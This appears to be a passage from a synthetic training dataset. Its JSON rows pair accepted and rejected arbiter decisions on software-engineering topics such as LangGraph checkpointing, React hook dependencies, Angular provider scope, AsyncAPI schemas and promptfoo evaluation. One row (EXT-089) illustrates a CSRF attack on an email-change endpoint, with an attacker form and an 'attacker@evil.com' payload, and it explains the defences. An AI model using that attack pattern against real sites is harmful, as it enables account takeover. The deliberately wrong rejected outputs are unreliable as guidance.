    "reprocessInstruction": "Facilitate a Sprint Goal conversation: what is the one thing this Sprint will accomplish that is valuable to stakeholders? If no single coherent goal can be identified for the 8 selected items, the backlog selection should be revised to build around one coherent theme. A valid Sprint Goal for a subset of these items might be: 'Stabilize the payment service: resolve the three payment-related bugs and upgrade the payment processor library.' Items outside that theme should be deferred."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The Sprint Goal is a statement of intent that the team will complete the committed items. Completing committed work is a valid Sprint outcome."
  },
  "arbiters": ["sprintGoalArbiter"],
  "whyAccepted": "Scrum Guide 2020 is explicit: the Sprint Goal is a 'single objective' and 'a commitment by the Developers.' Restating the list of work items as the objective does not create coherence — it removes the planning pressure to find a coherent focus.",
  "whyRejected": "The rejected output evaluates 'complete committed work' as a goal. The Scrum Guide does not define the Sprint Goal as 'completing what was selected.' A team that consistently produces list-restatement goals avoids the discipline of focused value delivery.",
  "sourceAnchors": [
    {
      "sourceId": "SCRUM-GUIDE",
      "url": "https://scrumguides.org/scrum-guide.html",
      "section": "Sprint Goal — Scrum Guide 2020",
      "license": "CC-BY-SA-4.0"
    }
  ],
  "licenseConstraint": "CC-BY-SA-4.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-083

```json
{
  "rowId": "EXT-083",
  "sourceIds": ["LANGGRAPH"],
  "sourceTrustTier": 1,
  "datasetFamily": "historyAndVersions_to_reprocessingDecision",
  "domain": "A_TOPOLOGY",
  "subdomain": "agent-graph-checkpointing",
  "rowClass": "migration-decision",
  "input": {
    "a": "Reprocessing decision: a LangGraph agent graph processed a 12-step research workflow. At step 9 the workflow failed due to a tool timeout. The operator wants to decide: should the graph replay from step 1, or should it resume from the last checkpoint before the timeout?",
    "b": "History: Steps 1–8 completed and checkpointed. Step 9 (external API call) timed out after 30 seconds. Checkpoint metadata: step_8_checkpoint = { state: {...}, messages: [...], tool_calls_completed: 8 }. The failed tool call in step 9 produced no partial output.",
    "c": "Context: LangGraph checkpointing — graphs can persist state at configurable checkpoints. Replaying from the beginning discards all completed work. Resuming from a checkpoint requires verifying that the checkpoint state is still valid — tool outputs from steps 1–8 may have time-sensitive data (timestamps, API tokens) that expire."
  },
  "function": "Produce a reprocessing decision: replay from start or resume from checkpoint, and what must be verified before the chosen path.",
  "acceptedOutput": {
    "reprocessingDecision": "RESUME from step_8_checkpoint subject to state validity check.",
    "validityChecks": [
      "Verify that no tool outputs in steps 1–8 contain data with TTL (Time To Live) shorter than the elapsed time since checkpoint. If an OAuth token in step 3 expires in 60 minutes and 45 minutes have passed, that token must be refreshed before resumption.",
      "Verify that the external state the graph depends on has not changed since the checkpoint — if the research target is a live API endpoint, confirm the data it returned in steps 1–8 is still current.",
      "If validity checks pass: resume from step_8_checkpoint and re-attempt step 9 only.",
      "If validity checks fail: replay from the affected step, not from step 1 — identify the earliest invalid step and replay from there."
    ],
    "reasoning": "Steps 1–8 succeeded and produced checkpointed state. Replaying from step 1 wastes the work of 8 completed steps and re-issues API calls unnecessarily. Resume is the correct default unless checkpoint state is invalid."
  },
  "rejectedOutput": {
    "reprocessingDecision": "Replay from step 1. Starting fresh guarantees a clean state and avoids any risk of using stale checkpoint data."
  },
  "arbiters": ["checkpointResumeArbiter"],
  "whyAccepted": "Checkpoint resumption is the purpose of checkpointing. Defaulting to full replay eliminates the value of the checkpoint system. The validity check handles the actual risk (stale time-sensitive data) without abandoning 8 completed steps.",
  "whyRejected": "Full replay is a safe but wasteful default. The rejected output treats 'fresh state' as inherently safer than 'validated checkpoint state.' A validated checkpoint is as safe as a fresh start and significantly cheaper.",
  "sourceAnchors": [
    {
      "sourceId": "LANGGRAPH",
      "url": "https://github.com/langchain-ai/langgraph",
      "section": "Persistence and checkpointing — resuming interrupted graph runs",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-084

```json
{
  "rowId": "EXT-084",
  "sourceIds": ["OPENAI-COOKBOOK"],
  "sourceTrustTier": 1,
  "datasetFamily": "userPrompt_to_machineCommands",
  "domain": "A_TOPOLOGY",
  "subdomain": "few-shot-prompt-construction",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "I need a prompt that teaches the model to extract structured JSON from customer support emails. The model should pull out: customer name, issue category (billing, technical, account), urgency (low, medium, high), and a one-sentence summary.",
    "b": "The prompt must work reliably across email styles — formal, casual, terse, verbose. It will be used for 10,000 emails per day in production.",
    "c": "Context: OpenAI Cookbook few-shot prompting pattern. Few-shot examples should be representative of the range of inputs, not just easy/clean cases. The examples should show the format the model should produce, not describe it. Edge cases — ambiguous urgency, missing name, multiple issues — need at least one example each."
  },
  "function": "Produce the few-shot prompt including system instruction and 3 example pairs covering normal, edge, and terse cases. The output schema must be machine-parseable JSON.",
  "acceptedOutput": {
    "prompt": "System: Extract structured data from customer support emails. Return only valid JSON with these fields: customer_name (string or null if not found), issue_category (billing|technical|account), urgency (low|medium|high), summary (one sentence, max 25 words). If multiple issues are present, use the primary issue.\n\nExample 1 — normal:\nEmail: Hi, I'm Sarah Thompson. My invoice for March shows a charge of $149 I don't recognize. This is quite urgent as my account may be suspended.\nOutput: {\"customer_name\": \"Sarah Thompson\", \"issue_category\": \"billing\", \"urgency\": \"high\", \"summary\": \"Customer disputes unrecognized $149 March charge and faces potential account suspension.\"}\n\nExample 2 — ambiguous urgency, no name:\nEmail: the app keeps crashing when i try to upload photos. been happening for 2 days\nOutput: {\"customer_name\": null, \"issue_category\": \"technical\", \"urgency\": \"medium\", \"summary\": \"App crashes consistently during photo upload for two days.\"}\n\nExample 3 — terse with implicit urgency:\nEmail: locked out. need access now. account: j.doe@corp.com\nOutput: {\"customer_name\": null, \"issue_category\": \"account\", \"urgency\": \"high\", \"summary\": \"Customer is locked out of account and requires immediate access restoration.\"}\n\nNow extract from the following email:\n"
  },
  "rejectedOutput": {
    "prompt": "You are a helpful assistant. Please read the customer support email below and extract the customer name, issue type, how urgent it is, and a summary. Return the results as JSON.\n\nEmail: {email}\n\nReturn JSON."
  },
  "arbiters": ["promptConstructionArbiter"],
  "whyAccepted": "The accepted prompt shows the schema in the system instruction (exact field names, type constraints, enum values), provides three examples covering a normal case, an edge case (no name, ambiguous urgency), and a terse case. The model learns the output format from examples rather than from description.",
  "whyRejected": "The rejected prompt describes what to extract but shows no examples. 'Issue type' is underspecified (no enum values). 'How urgent it is' does not specify the scale. With 10,000 emails daily, inconsistent urgency labels create downstream classification failures.",
  "sourceAnchors": [
    {
      "sourceId": "OPENAI-COOKBOOK",
      "url": "https://github.com/openai/openai-cookbook",
      "section": "Few-shot prompting — example selection and format specification",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-085

```json
{
  "rowId": "EXT-085",
  "sourceIds": ["REACT-CORE"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "react-hook-correctness",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this React component result: a useEffect hook fetches user data when a userId prop changes, but the dependency array omits userId and includes only an empty array [].",
    "b": "useEffect(() => { fetch('/api/users/' + userId).then(r => r.json()).then(setUser); }, []); — userId is used inside the effect but absent from the dependency array.",
    "c": "Context: React hooks dependency array contract. A dependency array of [] means the effect runs only once on mount. If userId is used inside the effect and changes, the effect does not re-run and the displayed user data becomes stale. React's exhaustive-deps ESLint rule flags this pattern. The correct array is [userId]."
  },
  "function": "Apply reactHookDependencyArbiter: verify that every value used inside a useEffect, useMemo, or useCallback hook is present in its dependency array.",
  "acceptedOutput": {
    "decision": "REJECT. userId is read inside the useEffect callback but is absent from the dependency array. When userId changes (e.g., navigating from user/1 to user/2), the effect does not re-run and the component continues showing user 1's data. The dependency array must be [userId].",
    "reprocessInstruction": "Change dependency array from [] to [userId]: useEffect(() => { fetch('/api/users/' + userId).then(r => r.json()).then(setUser); }, [userId]); Also add an AbortController to cancel the in-flight request when userId changes before the fetch completes, preventing a race condition where a slower request from userId=1 resolves after userId=2's request."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The empty dependency array is intentional — it ensures the fetch runs only once on mount, preventing excessive API calls when the parent component re-renders."
  },
  "arbiters": ["reactHookDependencyArbiter"],
  "whyAccepted": "React's exhaustive-deps rule is not optional for correctness. Preventing excessive re-renders is a valid concern but must be achieved through memoization of the parent (React.memo, useCallback) not through incorrect dependency arrays. The effect reads a prop; it must depend on that prop.",
  "whyRejected": "The rejected output accepts a known incorrect pattern on performance grounds. Excessive API calls are addressed by controlling when the prop changes, not by skipping the dependency. The bug is real and reproducible by navigating between users.",
  "sourceAnchors": [
    {
      "sourceId": "REACT-CORE",
      "url": "https://github.com/facebook/react",
      "section": "Hooks reference — useEffect dependency array correctness",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-086

```json
{
  "rowId": "EXT-086",
  "sourceIds": ["ANGULAR-DOCS"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "A_TOPOLOGY",
  "subdomain": "angular-provider-scope",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Arbitrate this Angular architecture result: a UserSessionService that holds the currently logged-in user's JWT, preferences, and cart is provided at the component level using providers: [UserSessionService] in a child component's @Component decorator.",
    "b": "@Component({ selector: 'app-checkout', providers: [UserSessionService] }) — UserSessionService is registered in the component's own injector. The checkout component tree gets its own instance of UserSessionService separate from the root instance.",
    "c": "Context: Angular provider scope — root (singleton), module, component (new instance per component). UserSessionService carries authenticated state (JWT) and cart. Registering it at component level creates a new, unauthenticated instance scoped to the checkout component tree. Other components that inject UserSessionService get the root instance. The checkout tree gets an isolated empty instance."
  },
  "function": "Apply angularProviderScopeArbiter: verify that services carrying shared application state (authentication, session, cart) are registered at the correct scope (root) and not accidentally scoped to a component subtree.",
  "acceptedOutput": {
    "decision": "REJECT. UserSessionService is registered in the checkout component's providers array, creating a new instance scoped to that component tree. The checkout component will receive an empty UserSessionService with no authenticated user and no cart. Authentication will appear to fail at checkout even if the user is logged in elsewhere in the application. The correct scope for session-carrying services is root singleton.",
    "reprocessInstruction": "Remove providers: [UserSessionService] from @Component. Instead, ensure UserSessionService uses @Injectable({ providedIn: 'root' }) so Angular's root injector provides one shared instance. Every component that injects UserSessionService will receive the same instance carrying the authenticated user's state."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. Providing UserSessionService at the component level gives the checkout flow its own isolated session scope, which prevents checkout state from leaking to other parts of the application."
  },
  "arbiters": ["angularProviderScopeArbiter"],
  "whyAccepted": "Authentication state must be shared across the application. Isolated component-level instances do not share the user's login status. Checkout isolation is a valid concern for temporary cart state, which should be a separate CheckoutSessionService — not the authenticated UserSessionService.",
  "whyRejected": "The rejected output treats 'isolated scope' as a feature. For a service that carries authentication, isolation means the checkout component cannot see the user's login. That is a functional bug, not a desirable isolation property.",
  "sourceAnchors": [
    {
      "sourceId": "ANGULAR-DOCS",
      "url": "https://github.com/angular/angular",
      "section": "Dependency Injection guide — provider scope and singleton services",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-087

```json
{
  "rowId": "EXT-087",
  "sourceIds": ["ASYNCAPI-SPEC"],
  "sourceTrustTier": 1,
  "datasetFamily": "machineCommand_to_machineActionItems",
  "domain": "B_ROUTING_SELECTION",
  "subdomain": "async-message-contract",
  "rowClass": "arbiter-construction",
  "input": {
    "a": "Define an AsyncAPI message schema for a UserRegistered event that must carry: user ID (UUID), email (validated format), registration timestamp (ISO 8601), and an optional referral code (alphanumeric, max 20 chars). Consumers must be able to validate incoming messages against this schema.",
    "b": "The event is published to a 'user.registered' channel. Consumers are: email service (needs email + userId), analytics service (needs all fields), and referral service (needs userId + referralCode, skips events with no referralCode).",
    "c": "Context: AsyncAPI 3.0 specification. The schema uses JSON Schema draft-07. Each field must have a type and format or pattern constraint. Optional fields must not appear in the required array. The message payload must be self-describing for consumer validation."
  },
  "function": "Produce the AsyncAPI 3.0 channel and message definition for the UserRegistered event. Fields must include type constraints. Required/optional split must match the specification.",
  "acceptedOutput": {
    "asyncapiDefinition": "asyncapi: 3.0.0\ninfo:\n  title: User Events\n  version: 1.0.0\nchannels:\n  user/registered:\n    address: user.registered\n    messages:\n      UserRegisteredMessage:\n        $ref: '#/components/messages/UserRegistered'\ncomponents:\n  messages:\n    UserRegistered:\n      name: UserRegistered\n      title: User Registered Event\n      payload:\n        type: object\n        required:\n          - userId\n          - email\n          - registeredAt\n        properties:\n          userId:\n            type: string\n            format: uuid\n            description: Unique identifier for the registered user\n          email:\n            type: string\n            format: email\n            description: Validated email address of the new user\n          registeredAt:\n            type: string\n            format: date-time\n            description: ISO 8601 timestamp of registration\n          referralCode:\n            type: string\n            pattern: '^[A-Za-z0-9]{1,20}$'\n            description: Optional referral code used during registration"
  },
  "rejectedOutput": {
    "asyncapiDefinition": "channels:\n  user.registered:\n    publish:\n      message:\n        payload:\n          userId: string\n          email: string\n          timestamp: string\n          referralCode: string (optional)"
  },
  "arbiters": ["asyncApiSchemaArbiter"],
  "whyAccepted": "The accepted schema uses correct AsyncAPI 3.0 structure: asyncapi version, info, channel with address, message reference, and a component message with full JSON Schema payload including format: uuid, format: email, format: date-time, and a pattern constraint for referralCode. Consumers can use this schema for validation.",
  "whyRejected": "The rejected output uses AsyncAPI 2.x syntax (publish/subscribe instead of channels/messages), omits format constraints, marks referralCode as 'string (optional)' which is not valid JSON Schema, and provides no required array. Consumers cannot validate against this schema.",
  "sourceAnchors": [
    {
      "sourceId": "ASYNCAPI-SPEC",
      "url": "https://github.com/asyncapi/spec",
      "section": "AsyncAPI 3.0.0 specification — message schema and channel definition",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-088

```json
{
  "rowId": "EXT-088",
  "sourceIds": ["PROMPTFOO"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "prompt-evaluation-result",
  "rowClass": "arbiter-construction",
  "input": {
    "a": "Arbitrate this promptfoo evaluation result: a JSON extraction prompt was evaluated against 50 test cases. The evaluation report shows 44 passed and 6 failed. The 6 failures all occur on test cases where the input email has a non-ASCII character in the customer name.",
    "b": "Evaluation report: 50 cases total. Passed: 44 (88%). Failed: 6 (12%). Failure pattern: all 6 failures have customer names containing é, ñ, ü, or ô. The model output for these cases wraps the customer_name in unicode escape sequences instead of preserving the UTF-8 character.",
    "c": "Context: promptfoo evaluates LLM prompt outputs against expected outputs and assertion functions. An 88% pass rate is not acceptable for production — the failure pattern is systematic (all failures share one root cause) and reproducible. Systematic failures indicate a prompt defect, not random variance."
  },
  "function": "Apply promptEvaluationArbiter: classify the failure pattern, determine whether it is systematic or random, and produce a reprocessing instruction targeting the root cause.",
  "acceptedOutput": {
    "decision": "REJECT for production. The 12% failure rate is systematic — all 6 failures share the same root cause (non-ASCII customer names). Systematic failures with a single root cause are not acceptable in production even at low rates, because they indicate that any input with the same property will fail. The customer name extraction will fail for all customers with accented characters in their names.",
    "reprocessInstruction": "Add a prompt instruction to preserve UTF-8 characters verbatim: append 'Preserve all characters in their original Unicode form. Do not escape non-ASCII characters. Return customer names exactly as they appear in the email, including accented letters.' Then re-evaluate against the 6 failing cases. Also add 5 new test cases with names from other character sets (Cyrillic, Arabic, CJK) to verify the fix generalizes beyond the tested accented-Latin cases."
  },
  "rejectedOutput": {
    "decision": "ACCEPT with monitoring. 88% pass rate exceeds the 85% internal threshold. The 6 failures are edge cases affecting a small fraction of users."
  },
  "arbiters": ["promptEvaluationArbiter"],
  "whyAccepted": "The arbiter must evaluate failure character, not just failure rate. A systematic failure (all failures share one root cause) has a 100% failure rate on inputs with that property. 88% overall rate misrepresents the risk to customers with non-ASCII names.",
  "whyRejected": "The rejected output uses an overall pass-rate threshold without checking failure distribution. Threshold-based acceptance without pattern analysis is the evaluation anti-pattern promptfoo is specifically designed to catch.",
  "sourceAnchors": [
    {
      "sourceId": "PROMPTFOO",
      "url": "https://github.com/promptfoo/promptfoo",
      "section": "Evaluation assertions — failure pattern analysis",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-089

```json
{
  "rowId": "EXT-089",
  "sourceIds": ["CWE-TOP25"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "injection",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this result for CSRF protection: a state-changing API endpoint (POST /api/account/email) accepts requests from any origin. The endpoint requires a valid session cookie for authentication but does not require a CSRF token or check the Origin/Referer header.",
    "b": "POST /api/account/email with body { newEmail: 'attacker@evil.com' }. Authentication: session cookie (httpOnly, Secure). CSRF protection: none. The endpoint changes the account email address.",
    "c": "Context: CWE-352 Cross-Site Request Forgery — rank 9 in CWE Top 25 2023. A CSRF attack causes a victim's browser to send a state-changing request to a trusted site while the victim is authenticated. Cookies are automatically included by the browser. An attacker page with <form action='https://app.example.com/api/account/email' method='POST'> can trigger this endpoint from any origin when the victim visits the attacker page."
  },
  "function": "Apply csrfArbiter: verify that all state-changing endpoints require CSRF protection that cannot be supplied by a cross-origin attacker.",
  "acceptedOutput": {
    "decision": "REJECT. CWE-352 applies. The endpoint modifies account state (email change) and accepts any origin. Session cookies are automatically included by the browser on all same-site and cross-site requests. An attacker page can trigger POST /api/account/email with the victim's session cookie without any special privileges — the victim's browser sends the cookie automatically.",
    "reprocessInstruction": "Add one of: (1) SameSite=Strict cookie attribute — this prevents the session cookie from being sent on cross-site requests at all, defeating the CSRF vector; (2) Double-submit cookie CSRF token — include a random token in both a cookie and the request body, verify they match server-side; (3) Origin header check — reject requests where Origin does not match the expected domain. Option (1) is preferred if browser support permits. Verify the fix blocks the scenario: an attacker HTML page making a cross-site POST to the endpoint."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The session cookie is marked httpOnly, which prevents JavaScript from reading it. The attacker cannot exfiltrate the session token from a cross-site attack."
  },
  "arbiters": ["csrfArbiter"],
  "whyAccepted": "CSRF does not require the attacker to read the cookie. The attack works because the browser includes the cookie automatically on cross-origin form posts. httpOnly prevents JavaScript from reading the cookie but does not prevent the browser from sending it to the target origin.",
  "whyRejected": "The rejected output confuses cookie exfiltration (XSS concern, prevented by httpOnly) with CSRF (cross-site request forgery, where cookie exfiltration is not the attack vector). httpOnly is not a CSRF defense.",
  "sourceAnchors": [
    {
      "sourceId": "CWE-TOP25",
      "url": "https://cwe.mitre.org/data/definitions/352.html",
      "section": "CWE-352 Extended Description — cookie inclusion in cross-site requests",
      "license": "MITRE CWE Terms of Use",
      "requiredNotice": "CWE™ is a trademark of The MITRE Corporation"
    }
  ],
  "licenseConstraint": "MITRE notice required",
  "trainingStatus": "candidate"
}
```

---

## EXT-090

```json
{
  "rowId": "EXT-090",
  "sourceIds": ["ANTHROPIC-SKILLS"],
  "sourceTrustTier": 1,
  "datasetFamily": "userPrompt_to_machineCommands",
  "domain": "A_TOPOLOGY",
  "subdomain": "skill-domain-routing",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "I need to understand why our API response times spiked yesterday from 120ms to 800ms p99. The spike started at 14:32 UTC and lasted 47 minutes. We did not deploy anything during that window.",
    "b": "Available skills: code-analysis (reads source files, finds patterns), data-analysis (queries metrics, plots trends), incident-investigation (correlates events across logs, deployments, and metrics), system-architecture (diagrams and topology reasoning).",
    "c": "Context: Anthropic skills routing — the domain splitter must identify which skill(s) the request activates. The request is an incident investigation: a time-bounded performance regression with no known deployment cause. Multiple skills may contribute but one skill drives the primary decomposition."
  },
  "function": "Route this user request to the correct skill(s). Identify the primary skill, any secondary skills, and produce the skill activation sequence.",
  "acceptedOutput": {
    "primarySkill": "incident-investigation",
    "secondarySkills": ["data-analysis"],
    "activationSequence": [
      "data-analysis: Query p99 response time for 14:00–16:00 UTC yesterday. Identify the exact start and end timestamps of the spike. Plot the time series.",
      "incident-investigation: Correlate the spike window (14:32–15:19 UTC) against: deployment log, infrastructure change log, database query slow log, upstream dependency health check, and auto-scaling events.",
      "data-analysis: If a correlation candidate is found, quantify the relationship — does the slow-log query count match the p99 spike shape?",
      "incident-investigation: Produce a root cause hypothesis with confidence level and the evidence that supports or contradicts each candidate."
    ],
    "rationale": "The request is an incident investigation — a time-bounded event that requires correlation across multiple data sources. data-analysis provides the metrics query and visualization capability. incident-investigation drives the correlation logic and produces the root cause output. code-analysis is not needed unless the investigation identifies a code change as the root cause. system-architecture is not needed unless the investigation reveals a topology change."
  },
  "rejectedOutput": {
    "primarySkill": "code-analysis",
    "rationale": "The spike may be caused by a slow code path. Reading the API source code will identify performance bottlenecks."
  },
  "arbiters": ["skillRoutingArbiter"],
  "whyAccepted": "Incident investigation for a time-bounded spike with no deployment requires log/metric correlation first. Code analysis is appropriate if the investigation finds a code-level root cause, but starting with code analysis for a temporal incident is the wrong entry point.",
  "whyRejected": "The rejected output routes to code-analysis because the symptom (slow response) sounds like a code problem. Code analysis cannot determine why an already-deployed codebase changed behavior at 14:32 without being modified. Temporal incidents require temporal correlation, not static code reading.",
  "sourceAnchors": [
    {
      "sourceId": "ANTHROPIC-SKILLS",
      "url": "https://github.com/anthropics/skills",
      "section": "Skill routing — domain decomposition for multi-skill requests",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```
